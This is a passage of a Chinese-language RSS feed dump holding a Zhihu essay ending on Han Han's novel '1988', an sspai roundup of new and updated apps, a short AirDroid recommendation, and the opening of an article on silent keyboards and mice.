data-private-watermark-src=\"v2-bb2f9af2f00940ad71e27cb5952a5d78\"></p>\n<p>韩寒在这部小说的通篇，都贯彻了他标志性的“理想国”氛围——一种似乎与现实脱离开的，荒诞而肆意的世界。而在小说结尾，韩寒才揭示了全书的真实：仿佛逍遥骑士一般的赴约之旅，不过是领回友人的骨灰，而与主角仿佛建立起纯爱关系、又进入了母亲角色的妓女，也终究回到属于自己的日常中。现实在最后终于露出了獠牙，撕毁了通篇的乌托邦。</p>\n<p>但正是有了现实的显露，才让结尾中短暂的“理想国”有了更丰富的含义。它不是脱离于客观世界的存在，而是根植于其中。在残酷而又冷漠的现实世界中，能够拥有这样的短暂乌托邦，才是最珍贵的事情——就像回荡起妓女歌声的瞬间，正因为随即而至的“接客了”，才显得格外地静谧而崇高。而这种微妙的氛围、信仰的闪烁，也正是《后会无期》里陈乔恩的抬首、王珞丹的漫步，带给我们的体验，很难被量化、转述、模仿，是属于韩寒的个人性特质，以及他的先天触觉。</p>\n<p>韩寒在结尾告诉我们：即使身处现实的残酷，也要坚守内心的理想，即使明知世界的真相，也要守住自己的信念。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-14aa34b844450a22dc97d3fd9f1b8567_720w.jpg?rss\" data-rawwidth=\"630\" data-rawheight=\"860\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-14aa34b844450a22dc97d3fd9f1b8567\" data-watermark-src=\"v2-b35ad4167e0cee0935bdf893abefb793\" data-private-watermark-src=\"v2-42cdf78a5e5c3b0068c549f647236ed5\"></p>\n<p>这或许也正是他本人的经历体会——离开中学时老师的“忠告”，写出作品时周遭的非议，投身赛车时的“玩票”，多年持续中的“打假”，结婚生子后“妥协”的质疑。而随着年龄的增长，他本人也确实有了很多对成人世界的倾泻与言和——不接广告原则的打破，更少的矜持，更多的商业。</p>\n<p>但即便如此，韩寒内心中最本质的坚持，或许从未改变——于一片风雨中，自我不疑。因此，他才写出了最后的一段，给徐浪，给所有能够被他称之为、也愿意视他为“朋友”的同路人，也给他自己：拍了拍衣服，想那又如何，反正我也是被他们笼罩着的人，他们先行，我替他们收拾着因为跑太快从口袋里跌落的扑克牌，我始终跑在他们划破的气流里，不过我也不曾觉得风阻会减小一些，只是他们替我撞过了每一堵我可能要撞的高墙，摔落了每一道我可能要落进的沟壑，然后告诉我，这条路没有错，继续前行吧，但是你已经用掉了一次帮助的机会，再见了朋友。</p>\n<p>事实上，在他的很多作品中，我们都能多少读出这样的表达。《一座城池》中“非现实国度”伴随着爆炸的破灭与拥抱软语的“梦想照进现实”。《后会无期》中理想主义者江河于宛若现实梦想中间地带的一片光晕中的人生圆满，以及现实主义者马浩瀚“你永远不知道，那就是最后一句”的文艺吟诵。《飞驰人生》中飞向悬崖的赛车手。现实与理想的冲突，现实与理想的共存，是这些作品共同的主题。</p>\n<p>但是，《1988》，是其中完成度最高，或许也是最接近韩寒构想中表达效果的一部。正如书名——站在成人阶段的韩寒，想以积累后的自我，与这个现实世界谈一谈。</p>\n<p>只有它，让现实中光芒乍现的乌托邦一瞬，变得神圣而万物不侵。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/segelas?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">segelas</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/484472016/answer/2106503781?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">13 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/472426257?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你看过的书或影视剧中，你觉得最惨的人是谁?</a><br><a href=\"http://www.zhihu.com/question/36660279?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有哪些影视剧高于原著，比原著更值得看？</a><br>\n","link":"http://www.zhihu.com/question/484472016/answer/2106503781?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派评 | 近期值得关注的 App","date":"2021-09-06 09:35:40","description":"\n<p>本期《派评》的内容有：</p>\n<ul>\n<li>彩云天气开发商推出 AI 写作工具：彩云小梦。</li>\n<li>Android 应用聚合更新工具：UpgradeAll。</li>\n<li>Apple 平台 Markdown 笔记工具：FSNotes。</li>\n<li>Android 老牌启动器 Nova Launcher 大版本更新。</li>\n<li>……</li>\n</ul>\n<p>你可以通过文章目录快速跳转到你感兴趣的内容。如果发现了其它感兴趣的 App 或者关注的话题，也欢迎在评论区和我们进行讨论。</p>\n<h2>不容错过的新 App</h2>\n<h3>彩云小梦：网文创作者的灵感源泉</h3>\n<ul>\n<li>平台：iOS / iPadOS / Web</li>\n<li>关键词：网文、人工智能、AI 写作</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Vanilla\" user-id=\"bs2ov5lb34tch278f9ag\" href=\"https://sspai.com/u/whoops\">@Vanilla</a>：彩云天气这款产品我想大家应该已经非常了解了，其实开发团队在其它领域内也有相当优秀的产品，比如说我在浏览外网报道时常用的浏览器插件——彩云小译，可以在网页上直接生成双语段落，浏览效率简直翻倍。而这次我要介绍的这款作品，是开发者团队使用人工智能技术打造的新作——彩云小梦。</p>\n<p>彩云小梦的核心功能是通过人工智能来进行文字创作，不过不是无中生有，而是可以在用户创作的基础上进行续写，并且可以给出三种不同方向的续写内容，让用户自主选择。如果我喜欢小梦续写的一段话，那么我可以它继续续写下一段，或者先对这一段进行一些修改。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtsddb34talblafap0.jpeg\"></figure><p>在屏幕的右侧有一个星球一样的按钮，点击就可以开启「平行世界」的功能。开启平行世界后，可以选择小梦续写片段的其它版本，进行实时切换。另外，还可以在右上角切换不同文笔风格的小梦，包括了纯爱、宴请、玄幻等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtsdlb34tamu2dhct0.jpeg\"></figure><p>在创作完成后，彩云小梦中可以进行进行简单的作品管理，还可以一键分享到微信、QQ 和微博等社交平台上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtsdtb34talblafapg.jpeg\"></figure><p>彩云小梦目前可以在 <a href=\"https://apps.apple.com/cn/app/id1564619616\" target=\"_blank\">App Store</a> 上免费下载使用，同时 <a href=\"https://if.caiyunai.com/dream/#/\" target=\"_blank\">网页版本</a> 也已经同步开放使用。</p>\n<span class=\"ss-application\" app-id=\"16158\"> </span><h3>UpgradeAll：应用聚合更新工具</h3>\n<ul>\n<li>平台：Android</li>\n<li>关键词：应用更新</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Noah_Choi\" user-id=\"bs2oudlb34tch2787tn0\" href=\"https://sspai.com/u/69zxdqx8\">@Noah_Choi</a>：Android 平台特色之一就是开放，除了应用商店，我们还可以从各种开放渠道下载优秀作品，当然，一些具备「实验性功能」和「尝鲜体验」的应用也只能通过这些渠道获取。只是想要保持更新，就得使用各种商店客户端，或者隔三岔五去 Github 查看 releases，时间久了总会感觉厌烦。UpgradeAll 这个工具就能完美解决这一痛点，它从源头跟踪版本发布，一个产品即可聚合多个渠道。</p>\n<p>首先要说明的是，UpgradeAll 并不傻瓜，使用起来有一些门槛。不过好在整个 UI 设计相对简洁明了，开发者也给出了 <a href=\"https://upgradeall.vercel.app/\" target=\"_blank\">说明文档</a>。一开始我们需要添加软件发布源，这相当于告诉 UpgradeAll 需要从哪里检测版本更新，由于检测机制限制，现阶段只能从 UpgradeAll 云端获取指定软件源，不过这其中也囊括了 Github、Gitlab 以及酷安、Google Play 等常用服务。在这里，我们还可以直接添加已经被配置好的应用信息，免去了自己一个一个手动添加的繁琐。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtsedb34tamu2dhctg.png\"></figure><p>如果添加的内容太多，界面看起来会比较乱，UpgradeAll 允许用户创建文件夹，例如我将来自于 Github 的开源 App 单独分类，这样查找起来会比较轻松。每一个项目旁边会有小图标提示，不同图标代表着已是最新、有版本更新、本机未安装以及检测失败，能够让用户快速了解当前应用状态。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtselb34tal9rab8l0.png\"></figure><p>如果云端服务没有目标 App，我们也可以手动添加。以少数派 Android 客户端为例，它发布于酷安，那么在「添加单个跟踪项」里将软件源设置为酷安（如果没有该选项就去云端服务添加软件源），之后依次复制「网址」和「包名」即可。这样即使你没有安装商店本体，也可以通过 UpgradeAll 检测并下载少数派客户端了。在这里还可以实现 Magisk 模块更新和 App 历史版本下载，对玩家来说可谓是「一站式服务」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtsf5b34talblafaq0.png\"></figure><p>除此之外，UpgradeAll 也支持「应用市场」模式，即通过软件源检测手机应用安装列表中所有软件的版本更新情况，使用效果就像安装了对应的应用市场一样。云端服务存在多种不确定性，所以 UpgradeAll 在设置中支持仓库地址和升级服务 URL 链接自定义，大家可以根据需要去填写来自于说明文档或社区分享的服务地址。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtsfdb34tal9rab8lg.png\"></figure><p>UpgradeAll 仍然在持续完善，更新密度比较大，开发者在社区中也比较活跃，对于用户反馈的跟进比较及时，如果你遇到了 bug 或有好的建议，可以与开发者交流。现在，你可以在 <a href=\"https://github.com/DUpdateSystem/UpgradeAll\" target=\"_blank\">GitHub</a> 或 <a href=\"https://www.coolapk.com/apk/net.xzos.upgradeall\" target=\"_blank\">酷安</a> 免费下载 UpgradeAll。</p>\n<span class=\"ss-application\" app-id=\"16159\"> </span><h3>Max：萌趣吃药提醒</h3>\n<ul>\n<li>平台：Android</li>\n<li>关键词：吃药提醒/健康</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Peggy_\" user-id=\"bs2p015b34tch278nkdg\" href=\"https://sspai.com/u/5isr02uh\">@Peggy_</a>：说到吃药，大部分人第一时间联想到的都是痛苦和遗忘，因为吃药而感到痛苦，但一旦遗忘遵照医嘱按时可能反倒会带来更持久的痛苦。与其依赖自己不靠谱的大脑，倒不如试试用应用 Max 当中的萌趣宠物来监督我们按时吃药吧。</p>\n<p>在 Max（事实上 Max 是狗狗的名字）当中，有三只小宠物可供用户选择，它们分别是小狗 Max、小猫 Katherine 和小鸡 Chunk。应用本身的设计非常有趣，整体采用了草绿色的主色调，非常活泼跳脱，而随着我们选择不同的宠物，应用在桌面上的图标和名称也会随之变换为相应的小动物，细节满分。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtsftb34tamsbi6ebg.jpeg\"></figure><p>在添加药物和设定提醒时间时，除了可以自由设定服药频率外，Max 还给出了生理周期提醒作为参考，例如按照女性生理期、孕期等自然周期设定服药频率。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtsg5b34tamsbi6ec0.jpeg\"></figure><p>设定完成后，应用会以列表形式按时间顺序展示我们一天所需服用的药品，而当我们接到用药提醒并点击「服用」后，Max 还会跳出来庆祝你变得更加健康，同时，应用也会将用药历史记录下来，方便你追踪自己的用药情况。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtsgdb34tal9rab8m0.jpeg\"></figure><p>在提醒方式上，除了常见的通知栏提醒外，一旦在用药时间没有及时进行服用，我们还能接到选定的宠物给我们打来的二次提醒「电话」，进一步防止我们忘记按时服药。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtsglb34tal9rab8mg.jpeg\"></figure><p>由于应用目前还在不断完善中，中文翻译略有错误，但用药提醒和记录这一主要功能已经完全可用。除了服药提醒外，你也可以把它作为喝水提醒应用，你可以通过 <a href=\"https://play.google.com/store/apps/details?id=com.artifyapp.mcare\" target=\"_blank\">Play Store</a> 免费下载体验 Max。</p>\n<span class=\"ss-application\" app-id=\"16160\"> </span><h3>FSNotes：功能丰富的 Markdown 笔记工具</h3>\n<ul>\n<li>平台：iOS / iPadOS / macOS</li>\n<li>关键词：笔记</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@红酒皇\" user-id=\"bs2p85tb34tcs0pmdeeg\" href=\"https://sspai.com/u/Fabrina\">@红酒皇</a>：FSNotes 是一款新型笔记应用，基础使用语言为 GFM Markdown。在 macOS 端记录笔记时，应用配置了足量的快捷方式，使用户在使用时可以完全脱离鼠标或触控板。例如，将 Markdown 编辑格式转换为预览时可以使用 <code>cmd - `</code>。</p>\n<p>在书写时，除了普通的文字编辑和简单样式外，FSNotes 还支持使用 MermaidJS 或 MathJax 来编译流程图或数学公式，其中行内公式使用双圆括号标记 <code>((eqn))</code>，行间公式使用双钱号 <code>$$eqn$$</code> 标记。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtsgtb34tamsbi6ecg.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtshdb34tamsbi6ed0.png\" alt=\"\"></figure><p>用户还可以使用内链与外链来扩充笔记的展度。内链使用双方括号标记 <code>[[links]]</code>，外链则直接输入网址（请注意在前后添加空格便于识别跳转）。内链可以用来创建目录页或构件整个笔记网络，在笔记页面间跳转，而外链将在用户设备的默认浏览器中打开。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtshlb34tal9rab8n0.png\"></figure><p>笔记文件整理方式为文件夹和标签，两者均无嵌套上限，标签的嵌套格式为 <code>#unlimited/sub/tags</code>，在文件内部使用记录标签时，将会自动弹出现有的所有包含标签。在设置中，用户可以选择文件夹的整理和排序方式，并区分待办事项与笔记文件。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtsi5b34talblafaqg.png\"></figure><p>笔记记录完毕后，除了常见的压平导出纯文本、富文本或 Markdown 格式文件外，FSNotes 还提供了导出为 Text Bundle 或 Encrypted Text Bundle 的选择。以前一种格式导出的文件，相较于 Markdown 文件，图片不再需要额外储存路径而是直接打包；后者则可以直接用 Python、Ruby 或 JS 语言解压。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtsilb34tamu2dhcu0.png\"></figure><p>在八月底更新的第四版中，iCloud Drive 的同步功能做得更流畅了，用户不再需要重启应用以查看更新。iOS 与 iPadOS 可以使用 Handoff 将文件一键传输，免去了多设备编辑文件的障碍。在移动端，由于更新了应用界面和缓存系统，用户使用起来也将感觉到更顺滑。创建笔记时，未特殊标明时，文件将自己选择第一行作为标题。现在移动端的预览格式常置为开，用户可以双击文件直接打开预览，同时旋转屏幕也可以横向查阅笔记了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtsitb34tal9rab8ng.png\"></figure><p>你可以在 App Store 下载 FSNotes 4.0 ，<a href=\"https://apps.apple.com/cn/app/fsnotes/id1277179284\" target=\"_blank\">macOS</a> 端售价 30 元，<a href=\"https://apps.apple.com/cn/app/fsnotes-manager/id1346501102\" target=\"_blank\">iOS 与 iPadOS</a> 端售价 18 元。</p>\n<span class=\"ss-application\" app-id=\"16161\"> </span><h2>值得关注的 App 更新</h2>\n<h3>Nova Launcher 7：老牌启动器久违更新</h3>\n<ul>\n<li>平台：Android</li>\n<li>关键词：启动器、桌面 App</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Kostya\" user-id=\"bs2p0rlb34tch278vmag\" href=\"https://sspai.com/u/kostya\">@Kostya</a>：Nova Launcher 从 Android 4 时代开始名声大噪，随着 Pixel Launcher 的日臻完善和 Android 系统在第三方启动器方面的逐渐封闭，往后却渐渐变得冷清了起来。</p>\n<p>不过 Nova Launcher 的「类 Pixel」体验依然是定制系统用户「尝鲜原生」必不可少的选择之一。在 Nova Launcher 7 基于 AOSP 源码完全重构并加入了大量新功能之后，它或许又多了一点值得你重新下载使用的理由。</p>\n<p>Nova Launcher 6 默认采用系统预设的动画来打开应用，跟进 AOSP 最新代码并重构之后的 Nova Launcher 7 则采用了更为接近 Android 11 的动画效果。</p>\n<p>同时，启动器整体界面和应用抽屉的默认设计都做了调整，这些也都可以体现在 Nova Launcher 7 的初始配置界面中。新版本 Nova Launcher 的黑色模式是跟随系统设定自动更改；你也可以选择黑色模式下的黑色背景的色值。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtsj5b34tamsbi6edg.png\"></figure><p>视觉上的另一处更新则是围绕小组件（Nova 官方翻译为「小工具」）的，现在你可以自定义小组件的圆角弧度了，直到你觉得足够 cool。可以想象，这一设置或许也是为了迎合 Android 12 全新的、更圆润的 Material You 设计语言而来的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtsjdb34talblafar0.jpeg\"></figure><p>Nova Launcher 7 的搜索功能也有所改进，默认搜索引擎由 Google 改为了 DuckDuckGo，可以容纳更多内容，包括这次新增的天气图标显示（数据来源是 AccuWeather）、调用 Google Assistant、Google Lens 等 Google 搜索延伸服务等等。当然，搜索栏可能也会因此变得更加拥挤。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtsjtb34tal9rab8o0.png\"></figure><p>在我看来，Nova Launcher 的意义就在于，在保持了原生 Android 的简洁「滋味」的同时，为用户增添了多种自定义自己 Andorid 主屏幕的方式。Nova Launcher 7 也一样，这次它终于跟进 AOSP 带来了更加现代化视觉体验，在搜索、小组件上也给了我们更多的自定义空间。较为遗憾的是，尽管本次更新是基于 AOSP 源码重构的，但 Nova Launcher 7 依然不是一款基于 Launcher3 代码开发的启动器，这也就意味着它依然不支持 QuickSwitch 模块和无缝多任务动画。</p>\n<p>目前，Nova Launcher 7 已经 <a href=\"https://play.google.com/store/apps/details?id=com.teslacoilsw.launcher\" target=\"_blank\">面向大众发布</a>，不过 Google Play 上的版本更新还未覆盖到所有用户。如果等不及，可以到 <a href=\"https://www.apkmirror.com/apk/teslacoil-software/nova-launcher/nova-launcher-7-0-45-release/\" target=\"_blank\">APKMirror</a> 获得最新 7.0.45 版本的安装包；或者也可以到 Google Play 加入 Nova Launcher 的 Beta 版计划，几分钟后即可安装最新的 Nova Launcher。</p>\n<span class=\"ss-application\" app-id=\"1653\"> </span><h3>Documents X：文件操作更快一步</h3>\n<ul>\n<li>平台：iOS / iPadOS</li>\n<li>关键词：文件管理器</li>\n</ul>\n<p>相比 iOS 上自带的「文件」App，我更喜欢使用一些第三方开发的文件资源管理器 App，而其中最让我满意当属由 Readdle 开发的这款名为「Documents by Readdle」的文件资源管理器，在这里除了可以存储不同类型的文件，更重要的他支持不同格式的文件的预览查看，并且可以在局域网中跨平台的进行文件共享。</p>\n<p>作为一款文件资源管理器，Documents by Readdle 现在已经支持 90多种文件格式，但在文件处理上远谈不上高效，原因则是整个操作非常的机械但没有优化成工作流程，基于这样的理念，Documents by Readdle 正式更新为 Documents X——让智能的操作工作流程代替繁琐的机械操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtsk5b34tamu2dhcug.png\"></figure><p>Documents X 的一项最为重大的改变在于更为智能的提醒用户进行接下来的操作，比如当你将文件上传到网盘时，会立刻建议你分享网盘链接；通过 Documents X 打开一个包含 PDF 的网页时，会提示你进行下载；而移动照片时会告诉你照片保存的具体位置——总之，通过基于本机的智能提示，让你在文件操作时可以快速完成、而不用对一些操作细节分散注意力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtskdb34tamu2dhcv0.png\"></figure><p>另一项更新则是网盘的集成，这一点上其实到有点儿像目前 iOS 上的「文件」App，无需切换到不同的网盘 App，直接通过 Documents X 里面就可以实现直观的文件操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtsklb34tamsbi6ee0.png\"></figure><p>除了功能之外，这一次的更新中还对整体的界面进行的调整，包括全新的图标、视图方式、菜单以及控件按钮等都和 iOS 设计一脉相承，而另一个设计上的细节则是图标上，让图标针对浅色主题和深色主题展示不同的内容。目前 Documents X 已经上架 <a href=\"https://apps.apple.com/cn/app/id364901807\" target=\"_blank\">App Store</a> 并提供免费下载。</p>\n<span class=\"ss-application\" app-id=\"12529\"> </span><h3>GoodNotes 更新：支持在笔记间批量拖拽页面，管好你的笔记</h3>\n<ul>\n<li>平台：iOS / iPadOS / macOS</li>\n<li>关键词：手写笔记</li>\n</ul>\n<p>iPad 上的分屏功能，于笔记应用绝对是「如虎添翼」，快速导入、内容拖拽等都能极大地提升笔记操作效率。上周，知名笔记应用 Goodnote 的一波小更新，同样将重点放在分屏功能上。</p>\n<p>新版 Goodnote 支持移动多页笔记至另一文档，最便捷的实现方式必然是通过分屏拖拽的操作。不过这个「一目了然」的功能在 Goodnote 上操作稍稍有那么些反人类。你按常规逻辑多选页面后直接拖动是无效的。首先，开启两侧分屏文档的缩略图模式，先拖动任意一页需要移动的笔记，再用另一只手指点击其它页面加入先前拖拽出来浮动页中，最后拖拽至另一笔记中重新布局。</p>\n<p>而在不支持拖拽的设备上，常规的多选逻辑又回来了，多选单页后通过原有的「拷贝-粘贴」方式，也可以实现多页内容的复制。如果你想移动文档中内容，可以在复制之后先将原文档中对应页面删除，再跳转至新文档粘贴。效率虽不及分屏拖拽，至少可以节省一次重复多选的操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4qtsktb34talblafarg.gif\"></figure><p>在全局搜索上，新版增加了层级关系的优化，新版展现结果时，会将标题搜索结果独立在正文结果之前展现。如果你笔记数量繁多，可以在一定程度上帮你排除繁杂信息，更快地找到所需笔记。不过这一改动并不影响笔记内搜索的展现，无需担心被额外的搜索信息干扰。</p>\n<p>Goodnote 5.0 售价 50 元，你可以 <a href=\"https://apps.apple.com/cn/app/goodnotes-5/id1444383602#?platform=mac\" target=\"_blank\">点击此处</a> 付费下载。</p>\n<p><strong>编注：</strong>作为众多少数派喜欢的手写笔记软件，GoodNotes 特别与少数派开展限时联名活动，推出开学季专属封面和模版，以及少数派贴纸。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/02/9a98e6ad6f3d22b702d6ec1be2254b55.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>少数派专属贴纸</figcaption></figure><p>即日起至 9 月 9 日，点击 <a href=\"http://qyt7tncoi.hn-bkt.clouddn.com/%E5%B0%91%E6%95%B0%E6%B4%BE%20%26%20GoodNotes%20%E8%81%94%E5%90%8D%E5%BC%80%E5%AD%A6%E7%A4%BC%E5%8C%85.zip\">下载链接</a>，即可获取联名开学礼包。更多关于开学礼包的活动介绍与使用指南，请前往 <a href=\"https://sspai.com/post/68589\" target=\"_blank\">GoodNotes 专栏</a> 查看。</p>\n<span class=\"ss-application\" app-id=\"14330\"> </span><h2>App 速报</h2>\n<ul>\n<li>Tweetbot（<a href=\"https://apps.apple.com/us/app/tweetbot-6-for-twitter/id1527500834\" target=\"_blank\">iOS</a>）：更新至 v6.3 版本，设置部分带来了新的「行为」设定体验部分，包括可以启用/禁用点击到顶部、启用 / 禁用拖放推文、启用/禁用滑动切换主题以及自定义所有标签功能等。同时针对 iPad 设备带来新的键盘快捷键，新的应用图标以及主题。</li>\n<li>Windows Terminal Preview（<a href=\"https://github.com/microsoft/terminal/releases\" target=\"_blank\">Windows 10</a>）：更新至 v1.11，加入了一个全新的半透明主题样式，此外允许在标签页下快速调用交换面板，在 Context 视图中拆分成标签。</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68624"},{"title":"好用的app","date":"2021-09-06 08:49:21","description":"\n<p>airdroid是android手机上比较好用的app</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/meng-zhong-meng-96?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">梦中梦丶</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/56821134?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"办公室与宿舍的防刺杀装备：静音键鼠详解","date":"2021-09-06 08:00:44","description":"\n<p>外设的流行趋势是个圈。在满大街都是各种稀奇古怪的机械结构时，用户呼唤的是更便宜、更轻巧的键盘；在薄膜键盘应声占领整个市场后，用户呼唤的是手感更好、更耐用的键盘；等到机械结构重新回到市场后，大家又开始怀念薄膜键盘的安静和柔软。</p>\n<p>好在我们活在一个制造业已经发达得多的时代，「静音外设」的需求也和其他的小众要求一样，从过去的替代性满足，进化到了针对性满足。键盘鼠标的「静音」不用再和差劲的体验划上等号。这篇文章，我们就来简单聊聊静音外设。</p>\n<h2>声音从哪里来</h2>\n<p>如果你住在集体宿舍，时不时去图书馆用功，或是在办公室工作，被眉头紧锁的同事包围，你可能就经受过使用键鼠时来自身边人满怀杀意的注目礼（或者你就是那个眼里带刀的人）。在安静的场所中，鼠标、键盘敲击时清脆的声音往往有极强的穿透力，不说到底能让多少人真的分心，光是那个齐刷刷的目光就足够让人羞进地底了。想要消除这些声音，首先要弄清楚这些声音是从何而来。</p>\n<p>众所周知，声音来自振动，物体间的碰撞可以产生振动，而我们目前使用的鼠标和键盘，大部分的触发原理还是依靠物理结构的通断，机械键盘和机械微动鼠标尤为典型。然而，即便没有采用机械开关，市面上的光轴、静电容、乃至薄膜键盘还是可以十分吵闹。这其实就说明了，虽然大部分机械开关触发音很大，但它绝对不是唯一的声音来源。</p>\n<p>我用一个机械键盘轴体来举例子。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4osrplb34t82dsrfol0.gif\"></figure><p>当我按下一个按键，我的手指接触的是键帽，键帽推动轴心，轴心下压弹簧，轴心上的小脚压迫动片，动静片接触，轴体触发。松开手指，弹簧推动轴心上移，弹片回弹，轴心上到顶部打到轴盖，轴体完全复位。</p>\n<p>在这个过程中，键帽可以跟随轴心发生晃动，轴体的触底和触顶都会打到轴壳；弹簧和弹片的活动都会产生声音，比如茶轴的段落感来自弯曲的轴心小脚，它在刮过弹片时也会让弹片产生突然的落差而发声；再极端一点，你熟悉的青轴直接把轴心截断，在活动过程中轴心的下半部分突然下弹，发出青轴特有的「咔」声。此外，量产键盘采用的定位板大多是金属材质，轴体产生的振动会带动定位板的振动，在键盘的空腔中产生额外的回响。这就是为什么你买的那些据说「无声」的红轴和黑轴键盘敲起来还是会让室友拎起棒球棍。</p>\n<p>常见鼠标的触发结构是微动。如果你的鼠标按键比较紧实，外壳没什么大的松动，那么几乎可以说鼠标的声音就是微动触发和复位的声音。所以鼠标的静音在理论上是比（机械）键盘要简单的：微动做到静音，鼠标就能静音。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4osrqlb34t82dsrfolg.gif\"><figcaption>拆开上盖的机械微动内部结构</figcaption></figure><p>微动的触发原理和机械轴体很类似，按下鼠标按键，按键柱压迫微动上的小推杆，它推动下方的弹片，直至发生变形，弹片向下摆动。按鼠标时的「喀——哒」两声其实就是弹片受压变形碰撞和复位的弹响。那么类似地，想要这种机械结构达成静音效果，就需要微动在按动时尽可能消除弹响的声音。</p>\n<h2>静音外设何以静音</h2>\n<p>上一节中我们已经说过，机械碰撞一定会产生振动，那么这些开关工作时的声响是不可避免的。那么这「静音」从何而来呢？</p>\n<p>以我的房间为例<sup class=\"ss-footnote\" href=\"\" title=\"采用 iPad Pro + Decibel X app 估测，若未提及，与声源距离大约 50cm。\" footnote-id=\"1\">1</sup>，在开着电脑日常工作时，房间的噪声大约在 40dB 左右，但频率的分布较为平均，并没有突出的频段。在敲击常见的机械键盘轴体（不是青轴）时，分贝数大约提升至 50dB，频率大概集中在 1k-8kHz；鼠标微动的这两个数值则分别是 55dB 和 4k-16kHz。作为对比，响指的分贝数大约是 80dB，频率集中在 2k-8kHz。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4osrrdb34t818p9aq6g.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4osrrlb34t82k08gbq0.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4osrs5b34t813bf10og.jpeg\" 